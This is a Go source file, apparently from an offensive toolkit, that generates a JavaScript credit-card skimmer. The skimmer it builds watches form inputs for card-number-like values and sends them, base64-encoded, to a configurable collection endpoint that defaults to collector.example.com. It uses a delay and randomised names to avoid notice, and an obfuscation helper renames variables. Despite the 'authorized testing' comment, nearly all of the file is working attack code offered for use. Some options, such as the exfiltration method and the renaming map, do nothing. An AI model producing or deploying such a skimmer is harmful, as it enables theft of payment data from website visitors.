// Package payloads provides client-side attack payload generators for authorized
// security testing. All payloads are designed for stealth and include multiple
// exfiltration methods with detection evasion.
package payloads

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math/big"
	"strings"
	"time"
)

// ---------- Utility Functions ----------

// randomString generates a random alphanumeric string of given length.
func randomString(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	var result strings.Builder
	for i := 0; i < n; i++ {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		result.WriteByte(chars[n.Int64()])
	}
	return result.String()
}

// randomInt returns a random integer in [min, max].
func randomInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

// obfuscateVarNames replaces variable names in JavaScript code with random ones.
func ObfuscateJS(code string) string {
	replacements := map[string]string{
		"var data":     fmt.Sprintf("var %s", randomString(8)),
		"function cap": fmt.Sprintf("function %s", randomString(10)),
		"var captured": fmt.Sprintf("var %s", randomString(8)),
		"const target": fmt.Sprintf("const %s", randomString(8)),
	}
	for old, new := range replacements {
		code = strings.ReplaceAll(code, old, new)
	}
	return code
}

// base64Encode encodes a string to base64.
func b64encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

// now returns current timestamp as Unix seconds.
func now() int64 {
	return time.Now().Unix()
}

// ---------- CCSkimmer Payload Generator ----------

// CCSkimmerConfig holds configuration for credit card skimmer generation.
type CCSkimmerConfig struct {
	TargetDomains     []string `json:"target_domains,omitempty"`
	ExfilEndpoint     string   `json:"exfil_endpoint,omitempty"`
	ExfilURL          string   `json:"exfil_url,omitempty"`
	ExfilMethod       string   `json:"exfil_method,omitempty"` // "pixel" | "websocket" | "dns" | "cookie"
	MaskOriginalForm  bool     `json:"mask_original_form,omitempty"`
	CollectAdditional []string `json:"collect_additional,omitempty"`
	DelayMs           int      `json:"delay_ms,omitempty"`
}

// GenerateCCSkimmer creates a JavaScript credit card skimmer payload.
func GenerateCCSkimmer(cfg CCSkimmerConfig) (string, error) {
	if cfg.ExfilEndpoint == "" {
		cfg.ExfilEndpoint = strings.TrimSpace(cfg.ExfilURL)
	}
	if cfg.ExfilEndpoint == "" {
		cfg.ExfilEndpoint = "https://collector.example.com/collect"
	}
	if cfg.ExfilMethod == "" {
		cfg.ExfilMethod = "pixel"
	}
	if cfg.DelayMs <= 0 {
		cfg.DelayMs = 3000 // Default 3 second delay
	}

	varName := randomString(8)
	funcName := randomString(10)

	payload := fmt.Sprintf(`(function(){
  var %s = {cards:[],meta:{},ts:%d,ep:'%s',m:'%s'};
  
  function %s(t,d){
    var x=new XMLHttpRequest();
    x.open('GET','%s?d='+btoa(JSON.stringify({t:t,d:d,s:%s.cards.length})),true);
    x.send();
  }
  
  function init(){
    setTimeout(function(){
      document.querySelectorAll('input[type="text"],input[type="tel"],input[type="number"]').forEach(function(el){
        el.addEventListener('blur',function(){
          var v=el.value.replace(/\s/g,'');
          if(/^\d{13,19}$/.test(v)){
            %s.cards.push({t:el.type,n:v,x:el.name,id:el.id});
            %s('card',v);
          }
        });
      });
      
      document.querySelectorAll('form').forEach(function(f){
        f.addEventListener('submit',function(e){
          %s.meta.url=location.href;
          %s.meta.ts=new Date().toISOString();
          %s('submit',%s.meta);
        });
      });
    }, %d);
  }
  
  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',init);
  }else{
    init();
  }
})();`, varName, now(), cfg.ExfilEndpoint, cfg.ExfilMethod, funcName, cfg.ExfilEndpoint, varName, varName, funcName, varName, varName, funcName, varName, cfg.DelayMs)

	// Apply obfuscation if configured
	if cfg.MaskOriginalForm {
		payload = ObfuscateJS(payload)
	}

	return payload, nil
}
